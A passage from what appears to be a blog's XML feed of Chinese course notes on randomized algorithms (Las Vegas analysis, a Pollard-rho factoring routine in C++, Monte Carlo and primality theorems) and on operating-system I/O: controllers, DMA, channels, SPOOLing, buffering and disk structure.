class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设p(x)是对输入x调用拉斯维加斯算法获得问题的一个解的概率。一个正确的拉斯维加斯算法应该对所有输入x均有<strong>p(x)&gt;0</strong>。（即至少有一个正确解）。<br>设t(x)是算法obstinate找到具体实例x的一个解所需的平均时间,s(x)和e(x)分别是算法对于具体实例x求解成功或求解失败所需的平均时间，则有：t(x) = p(x)s(x)+(1-p(x))(e(x)+t(x))<br>解方程得：p(x)t(x) = p(x)s(x)+(1-p(x))e(x)<br>t(x) = s(x) + ((1-p(x))/p(x))e(x)</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><h5 id="n后问题"><a href="#n后问题" class="headerlink" title="n后问题"></a>n后问题</h5><p>方法一：回溯法<br>方法二：随机放置策略与回溯法相结合。<br>只随机放置实际效果并不好。<br>根据p229，表7-1：<br>做两步随机化的效率最高，得到解的概率为0.875，时间为28.2</p><h5 id="整数因子分解"><a href="#整数因子分解" class="headerlink" title="整数因子分解"></a>整数因子分解</h5><p>给定一个合数n，求n的一个非平凡因子(<code>1&lt;x&lt;n</code>)的问题称为整数n的因子分割问题。<br>$$ n = p_1^{m_1}p_2^{m_2}……p_k^{m_k} $$<br>（1）在开始时选取0～n-1范围内的随机数，然后递归地由$x_i = (x_{x-1}^2 -1)  mod  n$<br>产生无穷序列 $x_1,x_2……,x_k,……$ </p><p>（2）对于$i=2^k$，以及$2^k&lt;j\leq 2^{k+1}$，计算出$x_j-x_i$与n的最大公因子$d=gcd(x_j-x_i，n)$</p><p>（3）如果d是n的非平凡因子，则实现对n的一次分割，算法输出n的因子d</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">Pollard</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 求整数n因子分割的拉斯维加斯算法</span>  RandomNumber rnd<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> x<span class="token operator">=</span>rnd<span class="token punctuation">.</span><span class="token function">Random</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 随机整数</span>  <span class="token keyword">int</span> y<span class="token operator">=</span>x<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    i<span class="token operator">++</span><span class="token punctuation">;</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">;</span>        <span class="token keyword">int</span> d<span class="token operator">=</span><span class="token function">gcd</span><span class="token punctuation">(</span>y<span class="token operator">-</span>x<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 求n的非平凡因子</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>d<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>d<span class="token operator">&lt;</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>       cout<span class="token operator">&lt;&lt;</span>d<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span>k<span class="token punctuation">)</span><span class="token punctuation">{</span>       y<span class="token operator">=</span>x<span class="token punctuation">;</span>        k<span class="token operator">*</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="蒙特卡罗-Monte-Carlo-算法"><a href="#蒙特卡罗-Monte-Carlo-算法" class="headerlink" title="蒙特卡罗(Monte Carlo)算法"></a>蒙特卡罗(Monte Carlo)算法</h3><p>求问题的准确解</p><h4 id="基本思想-2"><a href="#基本思想-2" class="headerlink" title="基本思想"></a>基本思想</h4><p>在实际应用中常会遇到一些问题，不论采用确定性算法或随机化算法都无法保证每次都能得到正确的解答。蒙特卡罗算法则在一般情况下可以保证对问题的所有实例都以高概率给出正确解，但是通常无法判定一个具体解是否正确。<br>设p是一个实数，且<code>1/2&lt;p&lt;1</code>。如果一个蒙特卡罗算法对于问题的任一实例得到正确解的概率不小于p，则称该蒙特卡罗算法是p正确的，且称p-1/2是该算法的优势。<br>如果对于同一实例，蒙特卡罗算法不会给出2个不同的正确解答，则称该蒙特卡罗算法是一致的。<br>有些蒙特卡罗算法除了具有描述问题实例的输入参数外，还具有描述错误解可接受概率的参数。这类算法的计算时间复杂性通常由问题的实例规模以及错误解可接受概率的函数来描述。</p><h5 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h5><p>主元素问题<br>素数测试(Miler_Robin算法)<br>Wilson定理：对于给定的正整数n，判定n是一个素数的充要条件是(n-1)! -1(mod n)。</p><p>即n与1、2、…、(n-1)这些小于n的所有整数互素 </p><p>费尔马小定理：如果p是一个素数，且<code>0&lt;a&lt;p</code>，则ap-1 1(mod p)。<br>     即：假如a是整数，p是素数，且a,p互质(即两者只有一个公约数1)，那么a的(p-1)次方除以p的余数恒等于1</p><p>二次探测定理：如果p是一个素数，且<code>0&lt;x&lt;p</code>，则方程x21(mod p)的解为x=1，p-1。</p>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随机化算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-第六章-输入输出系统</title>
      <link href="/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F/"/>
      <url>/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<!--more-->   <h2 id="I-O-系统的功能、模型和接口"><a href="#I-O-系统的功能、模型和接口" class="headerlink" title="I/O 系统的功能、模型和接口"></a>I/O 系统的功能、模型和接口</h2><ol><li>什么是I/O系统 用于实现数据输入、输出及数据存储的系统。   </li><li>I/O系统的主要对象<br>I/O设备<br>相应的设备控制器   </li><li>I/O系统的主要任务<br>完成用户提出的I/O请求<br>提高I/O速率<br>提高设备的利用率<br>能为更高层的进程方便地使用这些设备提供手段   </li></ol><h3 id="I-O系统的基本功能"><a href="#I-O系统的基本功能" class="headerlink" title="I/O系统的基本功能"></a>I/O系统的基本功能</h3><ol><li>方便用户使用I/O设备<br><strong>隐藏物理设备的细节</strong><br>I/O设备的类型非常多，且彼此间在多方面都有差异.如：接收和产生数据的速度 、传输方向 、粒度 、数据的表示形式及可靠性<br>配置相应的设备控制器<br><strong>与设备的无关性</strong><br>在隐藏物理设备细节的基础上实现<br>用户可以使用抽象的I/O命令 、使用抽象的逻辑设备名来使用设备 、可有效地提高OS的可移植性和易适应性   </li><li>提高CPU和I/O设备的利用率<br><strong>提高处理机和I/O设备的利用率</strong><br> 尽可能地让处理机和I/O设备并行操作，以提高它们的利用率<br> 许多I/O设备间是相互独立的，能够并行操作<br> 处理机与设备之间也能并行操作<br> 要求处理机能快速响应用户的I/O请求，使I/O设备尽快地运行起来<br> 尽量减少在每个I/O设备运行时处理机的干预时间<br><strong>对I/O设备进行控制</strong><br>对I/O设备进行控制是驱动程序的功能对I/O设备有四种控制方式：<br>①采用轮询的可编程I/O方式<br>②采用中断的可编程I/O方式<br> 低速设备（打印机、键盘终端等）<br>③直接存储器访问方式<br> 高速设备（磁盘、光盘等）<br>④ I/O通道方式<br> 独立进行而无需CPU的干预   </li><li>在共享设备时提供方便<br><strong>确保对设备的正确共享</strong><br>从设备的共享属性上，可将系统中的设备分为如下两类：<br>(1) 独占设备<br> 进程应互斥地访问这类设备<br> 典型的独占设备：打印机、磁带机等<br>(2) 共享设备<br> 允许多个进程同时访问的设备<br> 典型的共享设备：磁盘<br><strong>错误处理</strong><br>大多数的设备都包括了较多的机械和电气部分，运行时容易出现错误和故障。<br>从处理的角度，可将错误分为临时性错误和持久性错误。<br>对于临时性错误，可通过重试操作来纠正，只有在发生了持久性错误时，才需要向上层报告。   </li></ol><h3 id="I-O系统的层次结构和模型"><a href="#I-O系统的层次结构和模型" class="headerlink" title="I/O系统的层次结构和模型"></a>I/O系统的层次结构和模型</h3><h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p>普遍采用层次式结构的I/O系统<br>每一层都是利用其下层提供的服务，完成输入输出功能中的某些子功能，并屏蔽这些功能实现的细节，向高层提供服务<br>通常把I/O软件组织成四个层次 ：<br>(1)用户层I/O软件<br>(2)设备独立性软件<br>(3)设备驱动程序<br>(4)中断处理程序<br><img src="/images/pasted-13.png" alt="upload successful" loading="lazy">   </p><h4 id="层次视图"><a href="#层次视图" class="headerlink" title="层次视图"></a>层次视图</h4><ol><li>I/O系统的上、下接口<br>(1)  I/O系统接口<br><strong>块设备接口</strong><br>块设备管理程序与高层之间的接口<br><strong>流设备（字符设备）接口</strong><br>流设备管理程序与高层之间的接口，又称为字符设备接口<br><strong>网络通信接口</strong><br>提供相应的网络软件和网络通信接口<br>(2) 软件/硬件(RW/HW)接口   </li><li>I/O系统的分层<br>与前面所述的I/O软件组织的层次结构相对应，I/O 系统本身也可分为如下三个层次：<br>(1) 中断处理程序<br> 处于I/O系统的底层，直接与硬件进行交互<br>(2) 设备驱动程序<br> 处于I/O系统的次底层，是进程和设备控制器之间的通信程序<br>(3) 设备独立性软件<br> 也称为与设备无关的软件，使I/O软件独立于具体使用的物理设备   </li></ol><h2 id="I-O设备和设备控制器"><a href="#I-O设备和设备控制器" class="headerlink" title="I/O设备和设备控制器"></a>I/O设备和设备控制器</h2><p>I/O设备组成   </p><ol><li>机械部件<br> 即设备本身（物理装置）<br>执行I/O操作   </li><li>电子部件<br> 即设备控制器或叫适配器<br>执行I/O控制<br>在小型和微型机中，它常采用印刷电路卡插入计算机主板上的总线插槽<br>通过若干接口寄存器或接口缓冲区与CPU通信   </li></ol><h3 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><ol><li>按传输速率分类<br>低速设备   键盘、鼠标<br>中速设备   打印机<br>高速设备   磁带机，光盘机   </li><li>按使用特性分类<br>I/O设备<br>存储设备   </li><li>按设备共享属性分类<br>独占设备<br>共享设备<br>虚拟设备   </li><li>按信息交换的单位分类<br>块设备（Block Device）：<br> 设备一次操作的数据传输单位是块<br> 常见设备：磁盘、磁带等<br> 特征：传输速率高；可寻址；DMA方式<br>字符设备（Character Device）：<br> 设备一次操作的数据传输单位是字符<br> 常见设备：键盘、终端、打印机和鼠标等<br> 特征：传输速率低；不可寻址；中断驱动方式   </li><li>按设备的固有属性分类<br>独占设备：在一段时间内只能由一个进程（用户）使用的设备，属于临界资源，如打印机、磁带机等<br>共享设备：在一段时间内可由多个进程同时使用的设备，如磁盘<br>虚拟设备：通过虚拟技术将一台独占设备改造为共享设备，供若干进程同时使用   </li></ol><h4 id="设备与控制器之间的接口"><a href="#设备与控制器之间的接口" class="headerlink" title="设备与控制器之间的接口"></a>设备与控制器之间的接口</h4><p>该接口中有三类信号：<br>1）数据信号：可由设备到控制器，称为输入；由控制器到设备称为输出。<br>2）控制信号：由设备控制器发送给设备，用于规定设备执行读、写或某种操作的信号。<br>3）状态信号：由设备到控制器，指示设备的当前状态。   </p><h3 id="设备控制器"><a href="#设备控制器" class="headerlink" title="设备控制器"></a>设备控制器</h3><p>设备控制器是CPU和I/O设备之间的接口，代替CPU控制设备，实现I/O设备和计算机之间的数据交换   </p><h4 id="设备控制器的基本功能"><a href="#设备控制器的基本功能" class="headerlink" title="设备控制器的基本功能"></a>设备控制器的基本功能</h4><p>1)接收和识别命令（控制寄存器）<br>  设备控制器将CPU送来的命令写入控制寄存器中，并进行译码。<br>2)数据交换（数据寄存器）<br>3)标识和报告设备的状态（状态寄存器）设备控制器的基本功能<br>4)地址识别（地址译码器）<br>  系统中的每个设备都有自己的地址段，设备接口电路中有多个寄存器，一个寄存器有唯一的一个地址，每个地址为I/O端口，该地址称为I/O端口地址。<br>  设备控制器必须能识别每个设备的地址。<br>5) 数据缓冲（缓冲器）<br>6) 差错控制   </p><h4 id="设备控制器的组成"><a href="#设备控制器的组成" class="headerlink" title="设备控制器的组成"></a>设备控制器的组成</h4><ol><li>CPU与控制器的接口   </li><li>控制器与设备的接口   </li><li>I/O逻辑   </li></ol><p>计算机系统中各部件都是通过总线来连接的。<br>总线是多个功能部件共享的信息传输线。采用总线结构便于部件和设备的扩充，使用统一的总线标准不同设备间互连将更容易实现。<br>总线的性能可用频率、带宽、速率等指标来衡量。   </p><h3 id="I-O控制方式"><a href="#I-O控制方式" class="headerlink" title="I/O控制方式"></a>I/O控制方式</h3><p>I/O控制方式指得就是CPU与外设的通信方式。目前在多通道程序设计环境下,I/O操作控制能力已经成为计算机系统综合处理能力的重要构成因素。<br>一般选取衡量I/O控制方式的好坏时应考虑如下因素：   </p><ol><li>信息传输效率尽量高，以形成大的吞吐量。   </li><li>I/O系统资源利用率好，实现资源的均衡使用。   </li><li>尽量减少CPU用于进行I/O处理的开销，使CPU效率得以充分发挥。   </li></ol><p>按照传输控制能力的强弱与速度,以及CPU与外设并行处理程度的不同。<br>常将I/O系统中信息的传输控制方式分为四类:   </p><h4 id="程序I-O方式"><a href="#程序I-O方式" class="headerlink" title="程序I/O方式"></a>程序I/O方式</h4><p>CPU在一条启动外设的I/O指令发出后，同时将忙/闲标志置为忙，如果外设的工作没有完成，则标志一直为忙，<br>CPU不断循环检测该标志，直到标志为不忙为止。然后， CPU就将数据寄存器的值取出，主存与外设之间便可以交换一定量的信息。<br>优点:实现简单，控制简单，基本不需额外硬件支持。<br>缺点:使CPU将大量的时间花费在循环等待上，使CPU 效率发挥极差，外设也不能合理利用，整个系统的效率很低。   </p><h4 id="中断方式"><a href="#中断方式" class="headerlink" title="中断方式"></a>中断方式</h4><p>利用中断信号，外设可以将自身操作的状态及时反馈给CPU，这样CPU便可以在发出一条I/O指令后，转去继续完成其他任务。当I/O操作完成后。外设控制器自动向CPU发出中断请求信号。CPU接到I/O中断信号后进行干预，启动I/O中断处理程序执行。<br>优点:<br>在外设进行数据处理时，CPU不必等待，可以继续执行该程序或其他程序。支持多道程序和设备并行操作。<br>缺点:<br>CPU每次处理的数据量少（通常不超过几个字节,由数据寄存器的大小而定），只适于数据传输率较低的设备。设备速度过高的话容易造成中断次数激增导致数据丢失。   </p><h4 id="DMA方式"><a href="#DMA方式" class="headerlink" title="DMA方式"></a>DMA方式</h4><ol><li>特点：<br>①数据传输的基本单位是数据块；<br>②所传送的数据是从设备直接送入内存的，或者相反；<br>③仅在传送数据块的开始和结束时，才需CPU干预，整块数据的传送是在DMA控制器的控制下完成的。   </li><li>组成：<br>(1) 数据寄存器DR 。<br>(2)    内存地址寄存器MAR 。<br>(3)    数据计数器DC 。<br>(4)    命令/状态寄存器CR 。   </li><li>局限性：<br>（1）DMA方式如果一次需要读多个数据块则需要CPU进行多次中断处理。<br>（2）多个DMA控制器的同时使用会引起内存地址的冲突并使得控制过程进一步复杂。   </li></ol><h4 id="通道方式"><a href="#通道方式" class="headerlink" title="通道方式"></a>通道方式</h4><ol><li>概念<br>通道是一个独立与CPU的、专门用来管理输入/输出操作的处理机，它控制设备与内存储器直接进行数据交换。<br>通道的指令被称为“通道命令字”，它的条数不多，主要涉及控制、转移、读、写及查询等功能。<br>若干通道命令字构成一个“通道程序”，它规定了设备应执行的各种操作和顺序。<br>在CPU启动通道后，由通道执行通道程序，完成CPU所交给的I/O任务。为了使通道能取到通道程序去执行，必须把存放通道 必须把存放通道程序的内存起址告诉通道。存放这个起始地址的内存固定单元，被称为“通道地址字”。   </li><li>通道方式传输数据的步骤   <ul><li>进程提出I/O请求后，CPU发start命令，指明I/O操作、设备号和对应的通道。把数据传输的任务交给通道。 发出I/O请求的进程被阻塞，进程调度程序把CPU分配给另一个进程使用。   </li><li>通道接收CPU发来的启动命令，调出通道程序执行，设备与CPU并行工作。   </li><li>通道执行通道程序中的<strong>通道命令字</strong>，指示设备完成规定的操作，与内存储器进行数据交换。   </li><li>数据传输完毕，通道向CPU发出<strong>中断请求</strong>。CPU响应通道提出的中断请求，对这次I/O进行善后处理，把阻塞进程的状态变为就绪，重新参与对CPU的竞争。   </li></ul></li><li>通道特点：<br>通道执行通道程序，向控制器发出命令，并具有向CPU发中断信号的功能<br>一旦CPU发出指令，启动通道，则通道独立于CPU工作<br>指令类型单一<br>通道没有自己的内存，通道程序在主机的内存中，即通道与CPU共享内存   </li></ol><h2 id="中断机构和中断处理程序"><a href="#中断机构和中断处理程序" class="headerlink" title="中断机构和中断处理程序"></a>中断机构和中断处理程序</h2><h2 id="中断机构和中断处理程序-1"><a href="#中断机构和中断处理程序-1" class="headerlink" title="中断机构和中断处理程序"></a>中断机构和中断处理程序</h2><h2 id="设备驱动程序"><a href="#设备驱动程序" class="headerlink" title="设备驱动程序"></a>设备驱动程序</h2><h2 id="与设备无关的I-O软件"><a href="#与设备无关的I-O软件" class="headerlink" title="与设备无关的I/O软件"></a>与设备无关的I/O软件</h2><h2 id="用户层的I-O软件"><a href="#用户层的I-O软件" class="headerlink" title="用户层的I/O软件"></a>用户层的I/O软件</h2><p>大部分I／O软件都包含在操作系统中<br>但仍有一小部分在用户空间，包括:   </p><ul><li>与用户程序连接在一起的库函数   </li><li>完全运行于内核之外的SPOOLi    g系统   </li></ul><h3 id="系统调用与库函数"><a href="#系统调用与库函数" class="headerlink" title="系统调用与库函数"></a>系统调用与库函数</h3><p>库函数   </p><ul><li>C语言、UNIX系统的库函数   </li><li>WiN32 API<br>系统调用是应用程序取得OS所有服务的<strong>唯一途径</strong><br>用户程序通过调用对应的<strong>库函数</strong>使用系统调用   </li></ul><h3 id="假脱机（SPOOLing）系统"><a href="#假脱机（SPOOLing）系统" class="headerlink" title="假脱机（SPOOLing）系统"></a>假脱机（SPOOLing）系统</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>通过多道程序技术将一台物理CPU虚拟为多台逻辑CPU，允许多个用户共享一台主机<br>通过假脱机技术将一台物理I/O设备虚拟为多台逻辑I/O设备，允许多个用户共享一台物理I/O设备<br>SPOOLing技术,也称为虚拟设备技术,多道程序设计系统中处理独占设备的一种方法<br>利用专门的外围控制机，先将低速I/O设备上的数据传送到高速磁盘上<br>利用假脱机技术可把独占设备转变成具有共享特征的虚拟设备，从而提高设备利用率<br>SPOOLing技术是对脱机输入/输出系统的模拟<br>SPOOLing系统建立在通道技术和多道程序技术的基础上，以高速随机外存(通常为磁盘)为后援存储器   </p><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><p>由输入/输出设备和通道、输入井和输出井、输入井和输出井管理程序、假脱机输入程序以及假脱机输出程序等部分组成<br>输入设备是数据的真正来源<br>输出设备是数据的最终到达地点   </p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ol><li>输入井和输出井<br>在磁盘上开辟出来的<br>输入井模拟脱机输入时的磁盘，用于收容I/O设备输入的数据<br>输出井模拟脱机输出时的磁盘，用于收容用户程序的输出数据   </li><li>输入缓冲区和输出缓冲区<br>在内存中开辟出来的<br>输入缓冲区用于暂存由输入设备传送的数据，之后再传送到输入井<br>输出缓冲区用于暂存从输出井传送的数据，之后再传送到输出设备   </li><li>输入进程和输出进程<br>  输入进程（预输入进程），用于模拟脱机输入时的外围控制机，将用户要求的数据从输入设备传送到输入缓冲区，再放到输入井。当CPU需要的时候，直接从输入井将数据读入内存<br>  输出进程（缓输出进程），用于模拟脱机输出时的外围控制机，将用户要求输入的数据从内存传送到输并存放到输出井。当输出设备空闲时，将输出井中的数据经过输出缓冲区输出至输出设备   </li><li>井管理程序：用于控制作业与磁盘井之间信息的交换   </li></ol><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol><li>提高了I/O的速度<br>对数据执行的I/O操作。已从对低速I/O设备执行的I/O操作演变为对磁盘缓冲区数据的存取，如同脱机输入输出一样，提高了I/O速度，缓和了CPU和低速I/O设备之间速度的不匹配的矛盾   </li><li>将独占设备改造为共享设备<br>因为在假脱机打印机系统中，实际上并没有为任何进程分配设备，而只是在磁盘缓冲区中为进程分配了一个空闲盘块和建立了一张I/O请求表   </li><li>实现了虚拟设备功能<br>宏观上，对于每一个进程而言，它们认为是自己独占了一个设备，即使实际上是多个进程在同时使用一台独占设备。也可以说，假脱机系统，实现了将独占设备变换为若干台对应的逻辑设备的功能   </li></ol><h4 id="假脱机打印机系统"><a href="#假脱机打印机系统" class="headerlink" title="假脱机打印机系统"></a>假脱机打印机系统</h4><p>打印机是经常用到的是输出设备，属于独占设备<br>利用假脱机技术将其改造为一台可供多个用户共享的打印设备，从而提高设备的利用率，也方便了用户   </p><p>组成   </p><ol><li>磁盘缓冲区<br>在磁盘上开辟的一个存储空间，用于暂存用户程序的输出数据   </li><li>打印缓冲区<br>设置在内存，暂存从磁盘缓冲区送来的数据，以后再传送给打印设备进行打印   </li><li>假脱机管理进程和假脱机打印进程<br>假脱机管理进程：为每个要求打印的用户数据建立一个假脱机文件，并把它放入假脱机文件队列<br>假脱机打印进程：依次对假脱机文件队列中的文件进行打印   </li></ol><h3 id="守护进程-daemon"><a href="#守护进程-daemon" class="headerlink" title="守护进程(daemon)"></a>守护进程(daemon)</h3><p>守护进程是运行在后台的一种特殊进程,它独立于控制终端并且周期性地执行某种任务或循环等待处理某些事件的发生<br>守护进程一般在系统启动时开始运行，除非强行终止，否则直到系统关机才随之一起停止运行   </p><ul><li>数据库守护进程   </li><li>日志服务进程<br>打印机守护进程   </li><li>取消原假脱机管理进程，由打印机守护进程代替   </li><li>打印进程将要求打印的文件放在假脱机文件队列中，并唤醒守护进程   </li><li>守护进程的任务是按照队列中每个文件的说明执行逐个打印任务，直至全部完成，然后休眠   <h2 id="缓冲区管理"><a href="#缓冲区管理" class="headerlink" title="缓冲区管理"></a>缓冲区管理</h2>缓冲区是一个存储区域，它可以由专门的硬件寄存器组成.更多的是利用内存作为缓冲区   <h3 id="缓冲的引入"><a href="#缓冲的引入" class="headerlink" title="缓冲的引入"></a>缓冲的引入</h3></li></ul><ol><li>缓和CPU与I/O设备间速度不匹配的矛盾   </li><li>减少对CPU的中断频率，放宽对中断响应时间的限制   </li><li>解决数据粒度不匹配的问题<br>可用于解决在生产者和消费者之间交换的数据粒度(数据单元大小)不匹配的问題   </li><li>提高CPU和I/O设备之间的并行性<br>在CPU(生产者)和打印机(消费者)之间设置缓冲区后，使CPU与打印机处于并行工作状态   </li></ol><h3 id="缓冲技术的实现原理"><a href="#缓冲技术的实现原理" class="headerlink" title="缓冲技术的实现原理"></a>缓冲技术的实现原理</h3><p>当某个进程进行数据输出操作时，先将数据送入缓冲区，当缓冲区满时再将缓冲区的内容送到输出设备上<br>当一个进程完成输入操作时，先将输入设备上的数据送入缓冲区，当缓冲区满时，再由CPU将数据取走<br>在缓冲管理中必须建立缓冲区，有两种设定方式   </p><ul><li>采用硬件方法实现缓冲   </li><li>采用软件缓冲的方式，即从主存空间中划定出一个特殊的内存区域作为缓冲区   </li></ul><h3 id="常用的缓冲技术"><a href="#常用的缓冲技术" class="headerlink" title="常用的缓冲技术"></a>常用的缓冲技术</h3><h4 id="单缓冲"><a href="#单缓冲" class="headerlink" title="单缓冲"></a>单缓冲</h4><p>当用户进程发出I/O请求时，操作系统在主存的系统空间为之分配一个缓冲区<br>可以实现预读和滞后写<br>从磁盘把一块数据输入到缓冲区的时间：T<br>OS将该缓冲区中的数据传送到用户区的时间：M<br>CPU对这一块数据处理(计算) 的时间：C<br>T和C可以并行工作<br>当T&gt;C时，系统对每一块数据的处理时间为：M+T<br>当T&lt;\C时，系统对每一块数据的处理时间为：M+C<br>可把系统对每一块数据的处理时间表示为：Max(C，T)+M   </p><h4 id="双缓冲"><a href="#双缓冲" class="headerlink" title="双缓冲"></a>双缓冲</h4><p>也称为缓冲对换<br>首先输入将数据送入BUF1，装满后，转向BUF2<br>可以实现用户数据区—缓冲区之间交换数据和缓冲区—外设之间交换数据的并行<br>在设备输入时，先将数据送入第一缓冲区，装满后便转向第二缓冲区<br>此时操作系统可以从第一缓冲区中移出数据，并送入用户进程<br>接着由CPU对数据进行计算<br>在双缓冲时，系统处理一块数据的时间可以粗略地认为是Max(C，T)<br>如果C&lt;\T，可使块设备连续输入<br>如果C&gt;T，可使CPU不必等待设备输入   </p><h4 id="环形缓冲"><a href="#环形缓冲" class="headerlink" title="环形缓冲"></a>环形缓冲</h4><p>要真正实现CPU与外设的并行操作，双缓冲技术还不能达到要求，在计算机中都采用多缓冲或缓冲池结构<br>为了便于管理，一般将多缓冲组织成循环缓冲形式，每个缓冲区的大小相同   </p><p><strong>组成（三类缓冲区）</strong>   </p><ol><li>空缓冲区R       用于存放数据      指针：Nexti   </li><li>已装满数据的缓冲区G  数据供进程使用    指针：Nextg   </li><li>现行工作缓冲区C    当前进程使用的缓冲区  指针：Current   </li></ol><p><strong>Getbuf过程</strong><br>计算进程要取数据： 将指针Nextg所指的缓冲区提供给进程使用，用Current指针指向该缓冲区的第一个单元，同时将Nextg移向下一个G缓冲区。<br>输入进程要使用空缓冲区装数据：将指针Nexti所指的缓冲区提供给输入进程使用，同时将Nexti移向下一个R缓冲区。   </p><p><strong>Releasebuf过程</strong><br>当计算进程把C缓冲区中的数据提取完时，调用该过程释放该缓冲区：将该缓冲区由当前工作缓冲区C改为空缓冲区R。<br>当输入进程将缓冲区装满时：将该缓冲区释放，并改为G缓冲区。   </p><p><strong>可能出现的两种情况</strong><br>Nexti指针追上Nextg指针（输入速度&gt;处理速度）：无空缓冲区，输入进程阻塞，称为系统受计算限制。<br>Nextg指针追上Nexti指针（输入速度&lt;处理速度）：无数据可取，计算进程阻塞，称为系统受I/O限制。   </p><h4 id="缓冲池"><a href="#缓冲池" class="headerlink" title="缓冲池"></a>缓冲池</h4><p>问题：循环缓冲仅适用于某特定的I/O进程和计算进程，属于专用缓冲。当系统较大时，会有很多这样的循环缓冲，不仅消耗大量内存，而且利用率也不高.<br>解决：公用缓冲池——池中缓冲区可供多个进程共享<br>缓冲池与缓冲区的区别:<br>缓冲区仅仅是一组内存块的链表<br>缓冲池则是包含了ー个管理的数据结构及ー组操作函数的管理机制， 用于管理多个缓冲区。   </p><p><strong>组成：</strong>   </p><ol><li>三个队列<br>空缓队列emq<br>由空闲缓冲区连接而成<br>用F(emq)指针指向队首，L(emq)指向队尾<br>输入队列inq<br>由装满输入数据的缓冲区连接而成<br>用F(inq)指针指向队首，L(inq)指向队尾<br>输出队列outq<br>由装满输出数据的缓冲区连接而成<br>用F(outq)指针指向队首，L(outq)指向队尾   </li><li>四个工作缓冲区<br>收容输入数据<br>提取输入数据<br>收容输出数据<br>提取输出数据   </li></ol><h2 id="磁盘存储器的性能和调度"><a href="#磁盘存储器的性能和调度" class="headerlink" title="磁盘存储器的性能和调度"></a>磁盘存储器的性能和调度</h2><h3 id="磁盘性能简述"><a href="#磁盘性能简述" class="headerlink" title="磁盘性能简述"></a>磁盘性能简述</h3><p>数据的组织和格式<br>磁盘-&gt;柱面-&gt;磁道-&gt;扇区<br>磁盘驱动器结构<br><img src="/images/pasted-14.png" alt="upload successful" loading="lazy"><br>盘面的数据布局（有8个扇区）<br><img src="/images/pasted-15.png" alt="upload successful" loading="lazy"><br>磁盘存储器<br>A：Track 磁盘磁道（粉红色部分）<br>B：Geometrical sector 几何学中的扇形（紫色部分）<br>C：Track sector 磁盘扇区（玫红色部分）<br>D：Cluster 块/簇（绿色部分）<br><img src="/images/pasted-16.png" alt="upload successful" loading="lazy">   </p><p>• 老式磁盘上，不同磁道扇区数相同<br>• 现代磁盘上，不同磁道扇区数不同<br>• 被划分为环带，外层环带的磁道比内层环带的磁道拥有更多的扇区   </p><h3 id="磁盘低级格式化"><a href="#磁盘低级格式化" class="headerlink" title="磁盘低级格式化"></a>磁盘低级格式化</h3><ul><li>磁盘使用之前，必须由软件进行低级格式化   </li><li>每条磁道(Track)含有30个固定大小的扇区(Sectors), 每个扇区容量为600个字节，其中512个字节存放<strong>数据</strong>，其余的用于存放<strong>控制信息</strong>   </li></ul><p><img src="/images/pasted-17.png" alt="upload successful" loading="lazy">   </p><h3 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h3><p>在低格之后，要对磁盘进行分区   </p><ul><li>逻辑上每个分区就象一个独立的磁盘   </li><li>如 Pentium Pentium和大多数机器上 和大多数机器上，0扇区包含主引导记录 扇区包含主引导记录，其中存放一些引导代码和末尾的分区表   </li><li>分区表给出每个分区的起始扇区和大小   </li><li>为了能从硬盘引导，在分区表中必须有一个分区被标记为活动的   </li></ul><h3 